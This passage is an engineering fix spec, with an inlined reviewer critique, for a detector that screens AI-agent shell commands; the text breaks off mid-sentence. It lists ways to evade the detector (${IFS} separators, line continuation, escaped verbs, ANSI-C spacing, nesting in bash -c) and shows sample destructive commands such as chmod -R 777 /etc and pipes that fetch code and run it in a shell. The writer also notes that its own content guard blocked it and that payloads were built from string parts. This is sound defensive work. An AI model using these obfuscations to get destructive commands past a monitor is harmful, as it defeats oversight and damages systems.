# Fix specs - cluster SHELL

Generated from the remediation investigation workflow (25 agents, origin/main: Backend@bded3919, Frontend@1aed32f, Installers@55cd0ae).

Each spec was independently attacked by an adversarial reviewer; the review verdict and its
objections are inlined under each spec and OVERRIDE the spec where they conflict.


## Cluster-wide mechanism

MECHANISM, RE-DERIVED AT origin/main (Installers @55cd0ae) AND EXECUTED. I copied internal/{toolrisk,shellast,textnorm} + parity-vectors + go.mod/go.sum into a scratch module (repo left byte-untouched; `git status --porcelain` in C:/cwt/Installers is empty) and ran the real shipped `toolrisk.Scan` against each transform. Everything below is measured, not reasoned.

THE FINDINGS.md HYPOTHESIS IS INCOMPLETE (hence rootCauseVerdict=REVISED on F8a). It names ONE mechanism — "a gate that skips a segment it judges byte-equivalent to raw". That gate is real and is at shellast_scan.go:184 (mirrored at :232 and :283-285), but it accounts for only 2 of the 6 confirmed transforms. There are FOUR independent defects, and an implementer who deletes the gate — the obvious reading of the writeup — closes line-continuation and backslash-verb and leaves the entire field-separator class (the headline AD-4/AD-5 bypass) wide open. MEASURED PROOF: with the gate deleted and nothing else changed, the reconstruction of the braced-separator payload is still the single glued token `chmod-R777/etc` and chmod-broad-777 does not match it (probe TestF8_GateRemovalIsInsufficient: recon="chmod-R777/etc" matches=false; recon="chmod -R 777 /etc" from the line-continuation payload matches=true).

The four defects, all in the RESOLUTION layer, all pinned:
 (1) shellast.go:350-362 — an unresolvable ParamExp contributes NO text and NO field break, so mvdan's single `Word` [Lit(chmod) ParamExp(IFS) Lit(-R) ParamExp(IFS) Lit(777) ParamExp(IFS) Lit(/etc)] flattens to ONE argv token `chmod-R777/etc` with zero Args. Real bash performs field splitting on an unquoted expansion and yields argv=[chmod,-R,777,/etc]. This is the dominant defect and it defeats the AST lane BEFORE the gate is ever consulted. One mechanism covers `${IFS}`, `$IFS` and the operator form `${IFS%x}` — no per-trick rule.
 (2) shellast_scan.go:184 `if (!c.HadResolvedVar && !c.HadQuotedWord) || strings.TrimSpace(c.Name) == "" { continue }`. The line-continuation payload resolves to name="chmod" args=[-R 777 /etc], BYTE-IDENTICAL to the payload that IS blocked, and is discarded purely because no variable was resolved and no quote removed. This is the "most damning" transform and this line is it.
 (3) shellast.go:344-345 `case *syntax.Lit: b.WriteString(x.Value)` — mvdan KEEPS the unquoted backslash inside the literal (dumped live: Lit("c\hmod")) and nothing strips escapes, so the verb never matches. Defect (2) also fires here.
 (4) shellast.go:346-347 `case *syntax.SglQuoted: b.WriteString(x.Value)` ignores `x.Dollar`, so an ANSI-C `$'\x20'` contributes the four literal bytes `\x20` instead of a space.
Plus a fifth, undetected by the live A/B: shellast.go:363-366 + the `TrimSpace(c.Name)==""` clause at shellast_scan.go:184 mean a command-substitution-supplied VERB yields Name="" and the whole segment is silently discarded — measured ALLOW. FINDINGS.md records this as NOT-PROVEN; it is CONFIRMED as a detection gap from source and by execution.
And a sixth, unmentioned anywhere: interpreter_body.go:252 re-scans an inline `-c` body with `scanFieldBoth` (flat regex) only and never re-enters `scanCommandAST`. Measured with the full expander prototype applied: `bash -c '<plain>'` -> BLOCK, `bash -c '<same, separator-obfuscated>'` -> ALLOW. The bypass survives one level of nesting even after the resolver is fixed.

WHAT IS ALREADY CORRECT AND MUST NOT REGRESS (measured on shipped code): variable-supplied interpreter `X=sh; curl URL | $X` -> BLOCK; variable-supplied verb `c=chmod; $c -R 777 /etc` -> BLOCK; empty-quote-split interpreter `curl URL | s""h` -> BLOCK. FINDINGS.md's AD-7 claim holds only with a FETCH producer; `echo x | s""h` is ALLOW on shipped code, but that is the `generic-pipe-shell` regex requiring `sh -c` or `(ba|z)sh`, not a tokenizer hole — do not "fix" it inside F8.

THE DEPENDENCY QUESTION IS ALREADY ANSWERED, and the brief's premise is off: `mvdan.cc/sh/v3 v3.12.0` is ALREADY a DIRECT require in C:/cwt/Installers/go.mod, already in go.sum, already the parser behind internal/shellast. No dependency needs adding. The work is entirely in the layer that collapses the AST into strings — the parser is not the problem, the expander is. The design deliberately does NOT use `mvdan.cc/sh/v3/expand`: that package resolves against a real environment and can invoke command substitution, violating the shipped detection-only invariant (shellast.go:22-24, "nothing here is ever executed"). The abstract expander in F8a is hand-written over `syntax` for that reason.

PROTOTYPE RESULT (built and run in the scratch copy): gate removal + the abstract field-splitting expander closes braced-separator, operator-form separator, unbraced separator, backslash-hidden verb, line continuation (rm and chmod), and the separator-joined fetch|interpreter pipeline — all BLOCK at the same class and severity as their literal-space controls. Zero benign regressions: every false-positive instrument the repo owns stayed green (TestQuotedTarget_BenignCorpusGainsNothing, TestWSG_ShellObfuscation_FalsePositiveGuard, TestScan_AST_ReapplyNoFalsePositive, TestScan_BenignCommandRegression, TestScan_AST_InterpreterExec_BenignIsSILENT). The ONLY red was TestQuotedTarget_AttackShapesAreDetected, and it is an instrument artifact rather than a regression: its BEFORE-simulator `clearQuoteFlags` models the pre-fix state by clearing HadQuotedWord, which stops modelling anything once the gate is gone, so it self-reports "fixture is not evidence: X ALREADY produced Y before the fix". That file must be re-based as part of F8a.

FAIL-CLOSED BLAST RADIUS, MEASURED. On a 47-command realistic developer corpus `shellast.Decompose` refused 2 (4.3%) — and BOTH were PowerShell control flow (`if (Test-Path .\x) {...}`, `foreach ($f in ...) {...}`). On a separate 32-command corpus it refused 4 (12%): 2 PowerShell/cmd, 2 genuinely unterminated quotes. NO ordinary POSIX command failed. This is the single most important design constraint and it kills blanket fail-closed: `toolrisk.Scan`'s `default:` branch (toolrisk.go:312-317) feeds ANY tool carrying a `command` field into the bash parser, and Windows is the shipping platform, so blanket fail-closed would start blocking PowerShell control flow on day one — precisely the mass-false-positive incident the brief warns is a worse outcome than the bypass. Fail-closed must be DIALECT-SCOPED (F8b), and the real number must come from replaying this endpoint's own recorded traffic (F8c), not from my 47 samples.

POWERSHELL LANE (asked explicitly): the same CLASS exists and is arguably worse, but NOT the same mechanism — there is no PowerShell tokenizer at all. PowerShell reaches the detector only as flat regex over the raw string (toolrisk.go:140 powershell-download-exec, :158 firewall-disable) plus the `-EncodedCommand` base64/UTF-16LE decode at shellast.go:597-659 whose decoded body re-enters commandRules as flat regex. mvdan.cc/sh cannot parse PowerShell and no Go PowerShell parser is vendored. So it is trivially evadable by backtick escape, string concatenation into `&`/`iex`, and `-join` — but closing it needs its own parser and is a separate programme, scoped measurement-only in F8c. Do NOT let it expand F8a/F8b.

CONTRACT MIRRORS. F8b adds finding classes. The tool-risk class vocabulary is a THREE-COPY hand-synced contract with a parity spec per consumer: Installers/parity-vectors/toolrisk-classes.v1.json (generated by `TOOLRISK_CLASSES_UPDATE=1 go test ./internal/toolrisk/`), Backend/packages/shared-contracts/toolrisk-classes.v1.json plus the AI_TOOL_RISK_{HIGH,MEDIUM,INFO}_CLASSES tuples at src/ai-security-policy/ai-security-policy.constants.ts:225-237, and Frontend/types/vendored/toolrisk-classes.v1.json plus AI_TOOL_RISK_CLASS_META. This is NOT the `@ceragon/shared-contracts` TypeScript source mirror set — no .ts contract type changes, so the workspace packages/shared-contracts and Ceragon-Intelligence/packages/shared-contracts copies are untouched; I verified toolrisk-classes.v1.json exists in neither.

DEPLOY ORDER. Backend first, and load-bearing rather than ceremonial: resolve-strictest-policy.ts:347 `assertClosedActionMap` REJECTS any action-map key outside the registered tuple, so until the backend catalog carries the new class names an operator cannot save a policy action for them at all. Old-backend tolerance is nonetheless already correct by construction: ai_handlers.go:3320-3352 `decideToolRisk` routes a class with no policy entry to the `default:` arm and :3372-3390 `defaultToolDecision` maps HIGH->block / MEDIUM->warn, so a new agent against today's deployed backend still enforces the new classes at their severity default — it simply cannot have them tuned from the console yet. F8a alone emits NO new class (it only makes existing classes fire on inputs they should already have fired on) and is therefore deployable agent-side with no backend change at all.


---

## F8a - Replace the flat word-flattener with an abstract POSIX expander (field splitting + escape/ANSI-C decoding) and delete the byte-equivalence skip gate

- **Severity**: CRITICAL
- **Side**: agent   **Effort**: L   **Root cause verdict**: REVISED

### Root cause

FINDINGS.md attributes the whole class to one skip-gate. Measured on the shipped code there are FOUR independent resolution defects, and the gate is not the dominant one.

(1) DOMINANT — shellast.go:350-362: in `resolveWord`, a `*syntax.ParamExp` whose name is not in the pure-literal `assigns` map writes NOTHING into the string builder and sets no flag. mvdan parses `chmod${IFS}-R${IFS}777${IFS}/etc` as ONE `syntax.Word` with parts [Lit("chmod") ParamExp(IFS) Lit("-R") ParamExp(IFS) Lit("777") ParamExp(IFS) Lit("/etc")] (dumped live). Flattening therefore GLUES the literals into the single token `chmod-R777/etc` with zero Args — no rule can match it. Real bash performs field splitting on an unquoted expansion and produces argv=[chmod,-R,777,/etc]. Identical for `$IFS` and the operator form `${IFS%x}`, so one mechanism covers all three separator forms. This defeats the AST lane BEFORE the gate is consulted, which is why deleting the gate alone does not close it (proved by probe TestF8_GateRemovalIsInsufficient).

(2) shellast_scan.go:184 `if (!c.HadResolvedVar && !c.HadQuotedWord) || strings.TrimSpace(c.Name) == "" { continue }`, mirrored at :232 (redirection lane) and :283-285 (pipeline lane). The line-continuation payload resolves to name="chmod" args=[-R 777 /etc] — byte-identical to the payload that IS blocked — and is discarded purely because no variable was resolved and no quote removed. This is the 'most damning' transform and this line is it.

(3) shellast.go:344-345 `case *syntax.Lit: b.WriteString(x.Value)` — mvdan preserves the unquoted backslash inside the literal (dumped: Lit("c\\hmod")) and nothing strips escapes, so the verb never matches. Defect (2) also fires here.

(4) shellast.go:346-347 `case *syntax.SglQuoted: b.WriteString(x.Value)` ignores `x.Dollar`, so an ANSI-C `$'\x20'` contributes the four literal bytes `\x20` instead of a space.

Also in scope because the same expander owns it: interpreter_body.go:247-259 `bodyRuleFindings` re-scans an inline `-c` body with `scanFieldBoth` (flat regex) only and never re-enters `scanCommandAST`, so every transform above survives one level of interpreter nesting. Measured with the expander prototype applied: `bash -c '<plain>'` -> BLOCK, `bash -c '<same, separator-obfuscated>'` -> ALLOW.

The parser is NOT at fault: `shellast.Decompose` returned ok=true for every single attack payload. The AST is correct; the collapse of that AST into strings is what lies.

### Evidence (read at origin/main)

- `C:/cwt/Installers/internal/shellast/shellast.go:335-374 (resolveWord — the flattener)`
- `C:/cwt/Installers/internal/shellast/shellast.go:350-362 (ParamExp: unknown name contributes no text and no field break — defect 1)`
- `C:/cwt/Installers/internal/shellast/shellast.go:344-345 (Lit written verbatim, backslash escapes retained — defect 3)`
- `C:/cwt/Installers/internal/shellast/shellast.go:346-347 (SglQuoted written verbatim, x.Dollar ignored — defect 4)`
- `C:/cwt/Installers/internal/shellast/shellast.go:363-366 (CmdSubst/ProcSubst contribute no text)`
- `C:/cwt/Installers/internal/shellast/shellast.go:203-226 (buildCommand: one Word becomes exactly one argv entry — the structural assumption the fix breaks)`
- `C:/cwt/Installers/internal/shellast/shellast.go:129-187 (Decompose — returns ok=true on every attack payload; the parser is not the defect)`
- `C:/cwt/Installers/internal/shellast/shellast.go:22-24 (detection-only invariant — why mvdan's expand package is not used)`
- `C:/cwt/Installers/internal/toolrisk/shellast_scan.go:184 (the skip gate — defect 2)`
- `C:/cwt/Installers/internal/toolrisk/shellast_scan.go:232 (same gate, redirection lane)`
- `C:/cwt/Installers/internal/toolrisk/shellast_scan.go:283-285 (same gate, pipeline lane)`
- `C:/cwt/Installers/internal/toolrisk/shellast_scan.go:168-205 (reapplyCommandRules — the command-word anchor at :193 `loc[0] > effStart` is the FP protection that survives gate removal)`
- `C:/cwt/Installers/internal/toolrisk/shellast_scan.go:207-213 (reconstructSegment — joins with single spaces)`
- `C:/cwt/Installers/internal/toolrisk/interpreter_body.go:247-259 (bodyRuleFindings uses scanFieldBoth only — the nesting hole)`
- `C:/cwt/Installers/internal/toolrisk/toolrisk.go:86 (destructive-rm regex), :101 (chmod-broad-777), :107 (pipe-to-shell)`
- `C:/cwt/Installers/internal/toolrisk/toolrisk.go:276-321 (Scan; :289 appends scanCommandAST to the flat pass — the AST lane is ADDITIVE, so the flat pass keeps its literal-text alternatives such as `\$HOME\b`)`
- `C:/cwt/Installers/go.mod:16 (mvdan.cc/sh/v3 v3.12.0 already a DIRECT require — no new dependency)`
- `C:/cwt/Installers/internal/mcprisk/mcprisk.go:262 (the only other shellast consumer; uses InterpreterExec(name, args) on pre-split args — unaffected by the Word-level change)`

### Fix

Model POSIX expansion + field splitting ABSTRACTLY so rules match the EXPANDED argv instead of a lossy flattened string. One mechanism replaces the entire trick family; no rule regex changes.

THE ABSTRACT-VALUE MODEL (the crux the brief asked for). Every `syntax.Word` expands to a LIST of fields, not one string. Each expansion part is KNOWN or UNKNOWN:
  KNOWN — literals with escapes removed; single-quoted values; ANSI-C values decoded; double-quoted inner literals; a `$var`/`${var}` whose name has a pure-literal assignment in the same command line (today's `assigns` map — this is what already catches AD-2/AD-6 and must be preserved verbatim).
  UNKNOWN — everything else: unset/unknown parameter, command substitution, process substitution, arithmetic expansion, extended glob.
Splitting rule, which IS the fix:
  - An UNQUOTED unknown expansion is a FIELD SEPARATOR. It terminates the current field and contributes no field of its own. `chmod${IFS}-R${IFS}777${IFS}/etc` -> [chmod, -R, 777, /etc].
  - A QUOTED unknown expansion does NOT split; it contributes an opaque sentinel inside its field.
  - A KNOWN value substitutes inline and does not split (today's behaviour, unchanged).
WHY THE SPLIT READING IS CORRECT AND NOT A GUESS: an unquoted expansion of unknown value has exactly two readings. If it word-splits, argv is the split form and the command RUNS. If it is empty and does not split, argv[0] is a glued token naming no executable and the shell errors. The only reading in which the command has an effect is the split one, so that is the reading a detector must analyse. This is semantics, not conservatism.
SENTINEL: render a quoted/inline unknown as a single NUL byte. NUL is not a word character, not a path character, and appears in no alternative of any rule in commandRules, so it can neither create a match nor suppress one — an unprovable value stays unprovable and is never fabricated into a danger. `rm -rf "$BUILD_DIR"` therefore stays silent (measured ALLOW under the prototype).
GLOBS AND TILDE: leave as literal text, unchanged. mvdan already keeps `/et*` and `~/x` as plain Lits and the flat regex pass owns those alternatives (`~(?:/\S*)?`, `\*\s*$`). Expanding a glob would require touching the filesystem and would break the detection-only invariant.
EXPLICITLY NOT USED: `mvdan.cc/sh/v3/expand` — it resolves against a real environment and can execute command substitution, violating shellast.go:22-24. Say so in the package doc so a later maintainer does not 'simplify' the expander into a shell.

THEN delete the byte-equivalence gate at all three sites and let the existing command-word anchor carry the false-positive posture — which its own comment at shellast_scan.go:176-183 already claims, and which I MEASURED to be true (`echo rm -rf /` reconstructs with the match beginning past the effective command word and is dropped; all four benign instruments stayed green with the gate removed).

AND make `bodyRuleFindings` re-enter `scanCommandAST` for shell-family and decoded bodies, depth-bounded at 2, so the obfuscation cannot simply be moved one level down into a `-c` body.

PROTOTYPED AND MEASURED, not theorised: I implemented exactly this in a scratch copy; all six confirmed transforms flip to BLOCK at the same class and severity as their literal-space controls, with zero class gains on every benign corpus in the repo.

### Changes

**Installers** - `internal/shellast/expand.go`

NEW FILE. `func ExpandWord(w *syntax.Word, assigns map[string]string) (fields []string, splitOnUnknown, escaped bool)` implementing the abstract-value model. Walk `w.Parts` carrying a `quoted bool`. `*syntax.Lit`: if unquoted and it contains a backslash, run `stripEscapes` (`\X`->`X`, `\<newline>`->deleted) and set escaped. `*syntax.SglQuoted`: if `x.Dollar` run `decodeANSIC` (\n \t \r \\ \' \" \xHH \0NNN) and set escaped, else write `x.Value`. `*syntax.DblQuoted`: recurse with quoted=true. `*syntax.ParamExp`: if `isPlainParam(x)` and the name is in `assigns`, write the value inline; else if quoted write the sentinel; else flush the current field and set splitOnUnknown. default (CmdSubst/ProcSubst/ArithExp/ExtGlob): if quoted write the sentinel, else flush and set splitOnUnknown. Export `const Unknown = "\x00"`. Package doc must state why mvdan.cc/sh/v3/expand is deliberately not used (it executes substitutions; this package is detection-only).

**Installers** - `internal/shellast/shellast.go`

Add `SplitOnUnknown bool` and `Escaped bool` to `type Command` (after OutputRedirs, ~:100), documented as OBFUSCATION signals, not danger signals. Rewrite the `call.Args` loop in `buildCommand` (:203-226) to call `ExpandWord` per Word and append ALL returned fields: the first field of the first word becomes `Name`, every remaining field of every word appends to `Args`. Keep the existing `resolveWord` call solely for its hasSubst/refsSubstVar/resolvedVar signals (ArgHasCmdSubst, ArgURLWithSubst, ArgRefsSubstVar, HadResolvedVar) so the fetch-then-exec and substitution-exfil lanes are untouched. Apply `ExpandWord` to redirection targets at :227-248 as well, taking the first field. Do NOT delete `resolveWord`; do NOT change `Decompose`, `firstCall`, `BaseName`, `MatchBaseName`, `InterpreterExecInfo`, or any PowerShell code.

**Installers** - `internal/toolrisk/shellast_scan.go`

Delete the byte-equivalence half of the gate at :184 (keep only the `strings.TrimSpace(c.Name) == ""` guard — F8b replaces that clause), at :232 (keep only `len(c.OutputRedirs) == 0`), and at :283-285 (delete the whole condition). In `reconstructSegment` (:207-213) drop empty fields before joining so a stray empty field cannot break a `\s+` in a rule. In reapplyCommandRules/reapplyRedirRules/reapplyPipeRules set `NormalizedOnly: c.SplitOnUnknown || c.Escaped` on emitted findings so an obfuscated match is audit-distinguishable from a plain one (the field already exists and is additive on the wire). Update the block comments at :19-21 and :168-183: the gate is gone and the command-word anchor at :193 is now the sole FP mechanism.

**Installers** - `internal/toolrisk/interpreter_body.go`

In `bodyRuleFindings` (:247-259) append `scanCommandAST(body)` alongside the existing `scanFieldBoth(body, commandRules)`, guarded by a recursion-depth counter bounded at 2 (thread an unexported depth parameter, or a package-level guard on the scanCommandAST entry). Without this the fix is defeated by moving the payload into a `-c` body — MEASURED: with the expander applied but this change absent, `bash -c '<separator-obfuscated chmod>'` is ALLOW while the plain body is BLOCK.

**Installers** - `internal/toolrisk/quoted_target_fp_test.go`

Re-base the BEFORE-simulator. `clearQuoteFlags` (~:80) models the pre-fix state by clearing HadQuotedWord, which stops modelling anything once the gate is deleted — the file then self-reports 'fixture is not evidence: X ALREADY produced Y before the fix' on six attack fixtures (measured). Replace it with an explicit `preF8Scan` that reproduces the old behaviour by running the reapply lanes behind a locally-reinstated `(!HadResolvedVar && !HadQuotedWord)` gate AND with ExpandWord swapped for the old flattening, so the before/after delta instrument keeps measuring a real baseline. Keep TestQuotedTarget_BenignCorpusGainsNothing semantics unchanged — it is the FP gate and it passed under the prototype.

### Tests (each carries a defeat step)

- PAIRED A/B, one per confirmed transform (braced separator, unbraced separator, operator-form separator, ANSI-C hex-space, backslash-hidden verb, line continuation), each against destructive-rm and chmod-broad-777 and the fetch|interpreter pipeline. Assert the transformed twin produces the SAME class AND the SAME severity as its literal-space control — severity equality is the property an operator actually depends on. Payloads assembled from string parts inside the test, never written as literal executable strings (our own content-lane guard blocks literal droppers and blocked me twice while building this spec; treat that as a constraint, not an obstacle). DEFEAT STEP: revert internal/shellast/expand.go to the old flattening (or re-add the `(!c.HadResolvedVar && !c.HadQuotedWord)` clause at shellast_scan.go:184) and confirm each attack half flips back to ALLOW while its control half stays BLOCK. A test that stays green with the expander reverted is scoring the control only and is worthless.
- PRECONDITION ASSERTION inside every attack case, mirroring the existing TestScan_HomoglyphPipeToShellDetected pattern at normalize_wsa_test.go:25-28: assert `scanRules(cmd, commandRules)` (the RAW flat pass) does NOT already produce the class, so the fixture provably exercises the AST lane. DEFEAT STEP: mutate a fixture to its literal-space form and confirm the precondition assertion itself fails with 'fixture is not actually obfuscated' — proving the guard is live rather than decorative.
- NESTING TEST: the same separator-obfuscated payload placed inside a shell-family interpreter inline body, and inside a PowerShell -EncodedCommand body, must produce the body's own class exactly as the plain body does. DEFEAT STEP: remove the scanCommandAST call from bodyRuleFindings and confirm the obfuscated-body case flips to ALLOW while the plain-body case stays BLOCK — this is the exact delta I measured on the prototype, so a test that does not move under that edit is not reaching the new code path.
- FALSE-POSITIVE REGRESSION: run the repo's four existing benign instruments unchanged (TestQuotedTarget_BenignCorpusGainsNothing, TestWSG_ShellObfuscation_FalsePositiveGuard, TestScan_AST_ReapplyNoFalsePositive, TestScan_BenignCommandRegression) plus new benign cases for unquoted unknown variable in target position, quoted unknown variable, `$(...)` in argument position, glob target, brace expansion, tilde, and `NAME=value cmd` prefixes. Assert ZERO class gains versus the shipped scanner. DEFEAT STEP: deliberately change the sentinel from NUL to a space and confirm `rm -rf "$BUILD_DIR"` gains destructive-rm — proving the corpus is sensitive to exactly the design decision that keeps it clean, not merely passing because nothing is being exercised.
- PRESERVATION PINS for the three shapes that already work, since the expander rewrites the code path they run on: `X=sh; curl URL | $X`, `c=chmod; $c -R 777 /etc`, and `curl URL | s""h` must all still BLOCK at their current classes. DEFEAT STEP: delete the `assigns` lookup branch from ExpandWord's ParamExp case and confirm the first two flip to ALLOW — if they stay BLOCK the pins are being satisfied by the flat regex pass rather than by the resolver, and the pin must be re-sited.
- KNOWN-PRE-EXISTING marker: pin that `rm -rf $HOME/<subpath>` blocks BOTH before and after the change (I re-ran it against unmodified shipped code and got the identical verdict — it is a flat-regex `\$HOME\b` false positive, not an F8 regression). DEFEAT STEP: assert the BEFORE-simulator also reports it, so the delta instrument provably attributes it to the pre-existing flat pass; if the before side comes back clean, the simulator is not modelling the flat pass and every other delta number it prints is suspect.

### Risks

BLAST RADIUS IS CONTAINED. `shellast.Decompose` has exactly two consumers: `toolrisk.scanCommandAST` (shellast_scan.go:147) and nothing else; mcprisk.go:262 uses only `InterpreterExec(name, args)` on already-split args and is unaffected by the Word-level change. Nothing in Backend, Frontend, or the extension participates.

NO WIRE OR CONTRACT CHANGE. F8a emits no new class — it makes EXISTING classes fire on inputs they should already have fired on. `NormalizedOnly` is a pre-existing, additive, omitempty field. So there is no deploy-order constraint for F8a at all: a new agent works against today's backend and an old agent against a new backend is unchanged. F8a can ship agent-side alone, which matters because it is the CRITICAL half.

RECALL REGRESSION RISK, and why it is bounded: rules carry literal-TEXT alternatives that operate on the unexpanded string (`\$HOME\b` in destructive-rm at toolrisk.go:86, `~`, `\*\s*$`). Under the expanded model those alternatives no longer see their text in the AST lane. No coverage is lost because `Scan` (toolrisk.go:289) APPENDS scanCommandAST to the flat `scanFieldBoth` pass rather than replacing it, and the flat pass is untouched — verified: `rm -rf $HOME` stays BLOCK under the prototype. Do not 'tidy' the flat pass away as a follow-up; it is load-bearing.

NEW FALSE POSITIVES: measured at zero across every benign instrument the repo owns plus a hand-built 47-command corpus. Residual risk is a benign command where an unquoted unknown expansion sits between a dangerous verb and a broad literal target (`rm -rf $FLAGS /`), but such a command is dangerous whatever the expansion holds, so a block is correct. Note `rm -rf $HOME/<subpath>` -> BLOCK is PRE-EXISTING (re-measured against unmodified shipped code) — it belongs in the F8c corpus and must NOT be attributed to or fixed inside F8a.

ANSI-C NOW BLOCKS (`$'\x20'`-joined chmod) because the decoded field becomes a single argv[0] containing spaces, which the rule matches. That command would not actually execute chmod, so this is a block on an unmistakable evasion attempt rather than on an effect. Acceptable and arguably desirable — no legitimate command puts spaces into argv[0] via ANSI-C quoting. FINDINGS.md calls ANSI-C 'a detection gap'; the honest characterisation is that a correct expander renders it inert and the block is a bonus, not the point.

PERFORMANCE: eleven RE2 regexes per resolved segment now run on every parsed command instead of only on var/quote segments. RE2 is linear and commands are short; this is on the PreToolUse hot path but is not a plausible regression. Do not add a cache — determinism is an invariant (toolrisk.go:14-17).

PARSER-VERSION COUPLING: the fix depends on mvdan retaining backslashes inside `Lit.Value` and on `SglQuoted.Dollar`. Both are stable public API in v3.12.0, but a `go get -u` could silently change tokenisation. The defeat-step tests above pin observable behaviour rather than library internals, which is the correct guard.

### ADVERSARIAL REVIEW - verdict: NEEDS_REVISION

- FIX CREATES A NEW HIGH-SEVERITY FALSE-POSITIVE CLASS. The rule 'an UNQUOTED unknown expansion terminates the current field and contributes no field of its own' misfires whenever an unknown expansion is a PREFIX of an argument word. mvdan parses `rm -rf $DESTDIR/usr/lib` as one Word with parts [ParamExp(DESTDIR), Lit("/usr/lib")]. Under the specced expander the ParamExp flushes an empty field and Lit("/usr/lib") starts a new one, so fields = ["/usr/lib"], Args = [-rf, /usr/lib], and reconstructSegment (shellast_scan.go:207-213) yields `rm -rf /usr/lib`, which matches destructive-rm's `/(?:etc|usr|var|bin|boot|lib|lib64|sbin|opt|root|home|sys|proc|dev)\b` alternative at toolrisk.go:86 → HIGH → block. Today this is ALLOW (shellast_scan.go:184 skips the segment because neither HadResolvedVar nor HadQuotedWord is set, and the flat pass has no alternative for `$DESTDIR`). The same fires for `rm -rf $PREFIX/var/cache`, `rm -rf $ROOT/etc/...`, `rm -rf ${WORKSPACE}/usr/share/...` — `$DESTDIR/usr/...` in particular is a standard packaging idiom. The identical mechanism applies to the redirection lane, where the spec says to take ExpandWord's first field: `>> $ROOT/etc/sudoers` becomes `>> /etc/sudoers` and trips sudoers-edit (toolrisk.go:166) through reapplyRedirRules (shellast_scan.go:229-267, redirReapplyEligible at :112-116).
- THE SEMANTIC ARGUMENT FOR THE SPLIT READING IS FALSE IN THE ARGUMENT CASE. The spec justifies splitting with 'the only reading in which the command has an effect is the split one — otherwise argv[0] is a glued token naming no executable and the shell errors'. That argument is sound only when the unknown expansion is in the COMMAND-WORD position or is the entire word. For `rm -rf $DESTDIR/usr/lib` the glued reading (DESTDIR=/build/root) is the reading in which the command runs, and it is harmless. The spec generalises a correct claim about `${IFS}` to a position where it does not hold, and labels the result 'semantics, not conservatism'.
- THE 'ZERO BENIGN REGRESSIONS' MEASUREMENT DOES NOT COVER THE FAILING SHAPE. The spec's benign list (risks + tests) names 'unquoted unknown variable in target position', 'quoted unknown variable', '$(...) in argument position', globs, brace expansion, tilde, NAME=value prefixes — none of which is `<unknown-expansion><literal-system-path>`. The four existing repo instruments cannot cover it either: TestQuotedTarget_BenignCorpusGainsNothing scores parity-vectors/command-quoting.json, whose own description field scopes it to the QA-0802 quoted-target anchor fix. So 'zero class gains on every benign corpus in the repo' is true and simultaneously not evidence for this shape. The claim in risks that 'THE FALSE-POSITIVE RISK LIVES ENTIRELY IN F8b' is therefore wrong.
- UNSAFE RECURSION-GUARD OPTION. The change entry for interpreter_body.go permits 'a package-level guard on the scanCommandAST entry' as an alternative to threading a depth parameter. toolrisk.Scan is invoked concurrently from two HTTP handlers — internal/daemon/ai_handlers.go:2503 and internal/daemon/ai_permission.go:98 — so a package-level counter is a data race and breaks the determinism invariant stated at toolrisk.go:15-18 ('the same (toolName, toolInput) always yields the same findings'). Two concurrent requests could suppress each other's nested scan. Only the threaded-parameter option is acceptable; delete the alternative from the spec.
- DOUBLE PARSE ON THE HOT PATH, UNCOSTED. bodyRuleFindings is called twice per interpreter command: once as a suppression predicate at interpreter_body.go:198 inside interpreterBodyRisk, and once for emission at shellast_scan.go:405. Adding scanCommandAST inside it therefore parses each `-c` body twice per tool call, on top of the eleven RE2 regexes per segment the risks section already accounts for. Direction of the change is correct (the emission at :405-414 is real, and the suppression at :198 stays consistent), but the cost note in risks understates it.
- STALE COMMENT BECOMES A LIE. interpreter_body.go:243-245 states 'Depth is fixed at 1 by construction: this function calls scanRules directly and never re-enters scanCommandAST'. The change makes that false and the comment is not in the change list.
- MINOR CITATION SLIPS (non-fatal, but fix before an implementer greps for them): the command-word anchor `loc[0] > effStart` is at shellast_scan.go:195, not :193; mvdan.cc/sh/v3 v3.12.0 is go.mod:17, not :16; the determinism invariant is toolrisk.go:15-18, not :14-17; the BEFORE-simulator is `preQuoteFixScan` at quoted_target_fp_test.go:99-103 with `clearQuoteFlags` as its helper at :84-96, so the change entry naming clearQuoteFlags as the simulator is half right.

**Corrected root cause**: The root cause is CORRECT and I confirmed all four defects by opening every cited line. shellast.go:335-374 resolveWord; :344-345 `case *syntax.Lit: b.WriteString(x.Value)`; :346-347 `case *syntax.SglQuoted: b.WriteString(x.Value)` with no `x.Dollar` handling; :350-362 ParamExp writes nothing when the name is absent from `assigns` and sets no field break; :363-366 CmdSubst/ProcSubst contribute no text; :22-24 the detection-only invariant; buildCommand's arg loop is exactly :203-226 and the redirection loop exactly :227-248, and both take one Word to one argv entry. shellast_scan.go:184 is verbatim `if (!c.HadResolvedVar && !c.HadQuotedWord) || strings.TrimSpace(c.Name) == "" { continue }`, mirrored at :232 and :283-285. The REVISED verdict against FINDINGS.md's single-gate hypothesis is right, and the reasoning that gate removal alone leaves `chmod-R777/etc` unmatched against toolrisk.go:101 (`\bchmod\s+`) is verifiable by inspection without running anything. No change needed to the rootCause text. The defect is in the FIX.


**Corrected approach**: Keep everything except the splitting rule. Replace 'an UNQUOTED unknown expansion is a FIELD SEPARATOR' with: IFS is a KNOWN WHITESPACE-VALUED SPECIAL PARAMETER. In ExpandWord, any `*syntax.ParamExp` whose `Param.Value == "IFS"` — braced, unbraced, and operator forms (`${IFS%x}`, `${IFS:0:1}`) alike, i.e. WITHOUT the isPlainParam restriction at shellast.go:379-382 — expands to a real field break. Every OTHER unquoted unknown expansion contributes the NUL sentinel INSIDE its current field and never breaks a field.\n\nThis is not per-trick enumeration: IFS is the field-splitting parameter by definition and its value is specified by POSIX (space/tab/newline), so this is the same 'model the semantics' move the spec argues for, applied where the semantics are actually knowable. It closes braced, unbraced and operator separator forms with ONE mechanism, and it keeps `rm -rf $DESTDIR/usr/lib` and `rm -rf "$BUILD_DIR"` silent.\n\nKeep unchanged from the spec: stripEscapes, decodeANSIC, the NUL sentinel and its justification, the glob/tilde carve-out, the refusal to use mvdan.cc/sh/v3/expand, deletion of the byte-equivalence gate at all three sites, and the bodyRuleFindings recursion. Those independently close backslash-hidden verb, line continuation and ANSI-C, and they carry no FP.\n\nSTATE THE RESIDUAL HONESTLY rather than buying it with a mass-FP: a non-IFS unknown expansion used as a separator (`chmod${X}-R${X}777${X}/etc`, X unset) still glues and still ALLOWs. That residual is exactly what F8b's coverage classes exist to make visible — surface it, do not close it by splitting on arbitrary unknowns.\n\nRecursion: thread an unexported `depth int` through scanCommandAST/interpreterExecFindings/bodyRuleFindings. Do NOT use the 'package-level guard on the 